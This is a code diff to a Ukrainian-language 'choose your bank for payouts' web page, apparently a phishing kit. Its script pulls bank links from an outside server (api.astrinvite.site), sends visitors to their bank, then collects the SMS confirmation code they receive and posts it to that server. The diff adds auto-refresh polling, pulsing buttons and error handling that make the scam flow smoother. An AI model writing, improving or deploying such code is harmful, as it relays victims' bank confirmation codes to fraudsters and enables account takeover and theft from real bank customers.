@@ -34,6 +34,7 @@
       text-decoration: none;
       color: #fff;
       display: flex; align-items: center; justify-content: center;
+      position: relative;
     }
     .mono   { background: #222; }
     .oschad { background: #215E4D; }
@@ -42,10 +43,19 @@
     .privat { background: #27AE60; }
     .bank-btn:disabled {
       background: #ccc !important;
-      color: #fff !important;
+      color: #888 !important;
       cursor: not-allowed;
-      opacity: 0.7;
+      opacity: 0.6;
     }
+    .bank-btn:enabled {
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { box-shadow: 0 1px 6px #0001; }
+      50% { box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4); }
+      100% { box-shadow: 0 1px 6px #0001; }
+    }
+
     #status {
       margin-top: 18px; color: #555; font-size: 18px;
       text-align: center; min-height: 44px;
@@ -70,16 +80,35 @@
     }
     #sms-error { color: red; margin-top: 5px; }
     #timer { color: #c60; margin-left: 16px; font-weight: bold; font-size: 20px; }
+
   </style>
 </head>
 <body>
+
+
   <h1>Виберіть ваш банк</h1>
   <div id="subtitle">Для отримання виплат виберіть банк, у якому у вас є діюча карта.</div>
-  <button class="bank-btn mono"   id="mono-btn"   disabled>Monobank</button>
-  <button class="bank-btn oschad" id="oschad-btn" disabled>Ощадбанк</button>
-  <button class="bank-btn raiff"  id="raiff-btn"  disabled>Raiffeisen Bank</button>
-  <button class="bank-btn pumb"   id="pumb-btn"   disabled>ПУМБ</button>
-  <a href="https://privatbank.ua/" class="bank-link privat" id="privat-link" target="_blank" rel="noopener">ПриватБанк</a>
+  
+  <button class="bank-btn mono" id="mono-btn" disabled>
+    Monobank
+  </button>
+  
+  <button class="bank-btn oschad" id="oschad-btn" disabled>
+    Ощадбанк
+  </button>
+  
+  <button class="bank-btn raiff" id="raiff-btn" disabled>
+    Raiffeisen Bank
+  </button>
+  
+  <button class="bank-btn pumb" id="pumb-btn" disabled>
+    ПУМБ
+  </button>
+  
+  <a href="https://privatbank.ua/" class="bank-link privat" id="privat-link" target="_blank" rel="noopener">
+    ПриватБанк
+  </a>
+  
   <div id="return-instruction">
     <b>Після підтвердження у вибраному банку поверніться на цю сторінку.<br>
     Код підтвердження з'явиться тут автоматично.</b>
@@ -88,64 +117,109 @@
   <audio id="sms-audio" src="sms.mp3"></audio>
 
   <script>
-const API_MAP = {
-  mono:   "https://api.astrinvite.site/link?bank=monobank",  // ← ИЗМЕНИТЬ!
-  oschad: "https://api.astrinvite.site/link?bank=oschadbank", // ← ИЗМЕНИТЬ!
-  raiff:  "https://api.astrinvite.site/link?bank=raiffeisenbank", // ← ИЗМЕНИТЬ!
-  pumb:   "https://api.astrinvite.site/link?bank=pumbbank"   // ← ИЗМЕНИТЬ!
-};
-const CONSUME_MAP = {
-  mono:   "https://api.astrinvite.site/consume-link?bank=monobank",  // ← ИЗМЕНИТЬ!
-  oschad: "https://api.astrinvite.site/consume-link?bank=oschadbank", // ← ИЗМЕНИТЬ!
-  raiff:  "https://api.astrinvite.site/consume-link?bank=raiffeisenbank", // ← ИЗМЕНИТЬ!
-  pumb:   "https://api.astrinvite.site/consume-link?bank=pumbbank"   // ← ИЗМЕНИТЬ!
-};
+    const API_MAP = {
+      mono:   "https://api.astrinvite.site/link?bank=monobank",
+      oschad: "https://api.astrinvite.site/link?bank=oschadbank",
+      raiff:  "https://api.astrinvite.site/link?bank=raiffeisenbank",
+      pumb:   "https://api.astrinvite.site/link?bank=pumbbank"
+    };
+    
+    const CONSUME_MAP = {
+      mono:   "https://api.astrinvite.site/consume-link?bank=monobank",
+      oschad: "https://api.astrinvite.site/consume-link?bank=oschadbank",
+      raiff:  "https://api.astrinvite.site/consume-link?bank=raiffeisenbank",
+      pumb:   "https://api.astrinvite.site/consume-link?bank=pumbbank"
+    };
+    
     const STATUS_URL = "https://api.astrinvite.site/api/link-status";
     const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
 
     const linkData = {};  // банк → { url, id }
-
     let currentBank = null;
     let currentId = null;
     let pollingStatus = false;
     let statusPoller = null;
+    let refreshInterval = null;
     let link = null;
     let smsTimerInterval = null;
     let smsSoundInterval = null;
+    let lastRefreshTime = Date.now();
+    let refreshCount = 0;
 
-    async function checkLinks() {
-      for (const bank of ["mono","oschad","raiff","pumb"]) {
-        const btn = document.getElementById(bank + "-btn");
-        btn.disabled = true;
-        btn.textContent = (
-          bank === "raiff" ? "Raiffeisen Bank" :
-          bank === "pumb"  ? "ПУМБ" :
-          bank.charAt(0).toUpperCase() + bank.slice(1)
-        );
-        try {
-          const res = await fetch(API_MAP[bank]);
-          if (res.ok) {
-            const data = await res.json();
-            if (data.url && data.id) {
-              linkData[bank] = { url: data.url, id: data.id };
-              btn.disabled = false;
-              btn.onclick = () => handleBankClick(bank);
-            }
+    // Состояние автообновления
+    let autoRefreshActive = true;
+    let refreshInProgress = false;
+
+    async function checkLinksForBank(bank) {
+      const btn = document.getElementById(bank + "-btn");
+      
+      if (!btn) return;
+
+      try {        
+        const res = await fetch(API_MAP[bank], {
+          method: 'GET',
+          cache: 'no-cache', // Принудительно обходим кэш
+          headers: {
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache'
           }
-        } catch {}
+        });
+        
+        if (res.ok) {
+          const data = await res.json();
+          if (data.url && data.id) {
+            linkData[bank] = { url: data.url, id: data.id };
+            btn.disabled = false;
+            btn.onclick = () => handleBankClick(bank);
+          } else {
+            btn.disabled = true;
+            btn.onclick = null;
+            delete linkData[bank];
+          }
+        } else if (res.status === 429) {
+          // Нет доступных ссылок
+          btn.disabled = true;
+          btn.onclick = null;
+          delete linkData[bank];
+        } else {
+          console.log(`Ошибка ${bank}: ${res.status}`);
+        }
+      } catch (error) {
+        console.error(`Ошибка проверки ${bank}:`, error);
+      }
+    }
+
+    async function checkAllLinks() {
+      if (refreshInProgress || !autoRefreshActive) return;
+      
+      refreshInProgress = true;
+      
+      try {
+        // Проверяем все банки параллельно
+        await Promise.all([
+          checkLinksForBank("mono"),
+          checkLinksForBank("oschad"),
+          checkLinksForBank("raiff"),
+          checkLinksForBank("pumb")
+        ]);
+        
+        lastRefreshTime = Date.now();
+        
+      } catch (error) {
+        console.error("Ошибка автообновления:", error);
+      } finally {
+        refreshInProgress = false;
       }
     }
 
     function resetUI() {
       document.getElementById("return-instruction").style.display = "none";
       document.getElementById("status").textContent = "";
-      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
-        const el = document.getElementById(id);
-        el.disabled = false;
-      });
+      autoRefreshActive = true; // Возобновляем автообновление
     }
 
     function showLoading(btnId) {
+      autoRefreshActive = false; // Останавливаем автообновление
       ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
         const el = document.getElementById(id);
         if(id !== btnId) el.disabled = true;
@@ -163,13 +237,19 @@ const CONSUME_MAP = {
       const data = linkData[bank];
       if (!data || !data.url || !data.id) {
         document.getElementById("status").innerHTML = "<span style='color:#b33'>Немає доступної ссилки для цього банку.</span>";
-        resetUI();
+        autoRefreshActive = true;
         return;
       }
 
       currentId = data.id;
       link = data.url;
-      fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
+      
+      try {
+        await fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
+      } catch (e) {
+        console.log("Ошибка consume:", e);
+      }
+      
       document.getElementById("return-instruction").style.display = "";
       window.location.href = link;
       pollStatus();
@@ -178,9 +258,12 @@ const CONSUME_MAP = {
     async function pollStatus() {
       if (pollingStatus) return;
       pollingStatus = true;
+      autoRefreshActive = false; // Останавливаем автообновление во время polling
+      
       ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
         document.getElementById(id).disabled = true;
       });
+      
       statusPoller = setInterval(async () => {
         try {
           const res = await fetch(`${STATUS_URL}?id=${currentId}`);
@@ -221,6 +304,11 @@ const CONSUME_MAP = {
           if (resp.ok) {
             document.getElementById("status").innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
             stopSMSTimer();
+            // Через 5 секунд возобновляем автообновление
+            setTimeout(() => {
+              autoRefreshActive = true;
+              checkAllLinks();
+            }, 5000);
           } else {
             document.getElementById("send-code-btn").disabled = false;
             document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
@@ -234,7 +322,7 @@ const CONSUME_MAP = {
 
     function startSMSTimer() {
       let seconds = 180;
-      playSMSAudio();
+      playSMSAudio(); // 🔊 Звук при появлении SMS запроса
       showSMSPush();
       updateSMSTimer(seconds);
 
@@ -246,6 +334,11 @@ const CONSUME_MAP = {
           clearInterval(smsTimerInterval);
           clearInterval(smsSoundInterval);
           document.getElementById("timer").textContent = "⏰ Час вичерпано!";
+          // Возобновляем автообновление
+          setTimeout(() => {
+            autoRefreshActive = true;
+            checkAllLinks();
+          }, 2000);
         }
       }, 1000);
     }
@@ -289,8 +382,44 @@ const CONSUME_MAP = {
       }
     }
 
-    // Запуск
-    checkLinks();
+    // Инициализация автообновления
+    function startAutoRefresh() {
+      // Первоначальная проверка
+      checkAllLinks();
+      
+      // Устанавливаем интервал автообновления каждые 3 секунды
+      refreshInterval = setInterval(() => {
+        if (autoRefreshActive && !refreshInProgress) {
+          checkAllLinks();
+        }
+      }, 3000);
+      
+      console.log("🔄 Автообновление запущено (каждые 3 сек)");
+    }
+
+    // Обработка видимости страницы (останавливаем при скрытии)
+    document.addEventListener("visibilitychange", () => {
+      if (document.hidden) {
+        autoRefreshActive = false;
+        console.log("⏸ Автообновление приостановлено (страница скрыта)");
+      } else {
+        autoRefreshActive = true;
+        checkAllLinks();
+        console.log("▶ Автообновление возобновлено (страница видима)");
+      }
+    });
+
+    // Запуск при загрузке страницы
+    window.addEventListener('load', () => {
+      startAutoRefresh();
+    });
+
+    // Очистка при закрытии
+    window.addEventListener('beforeunload', () => {
+      if (refreshInterval) {
+        clearInterval(refreshInterval);
+      }
+    });
   </script>
 </body>
 </html>
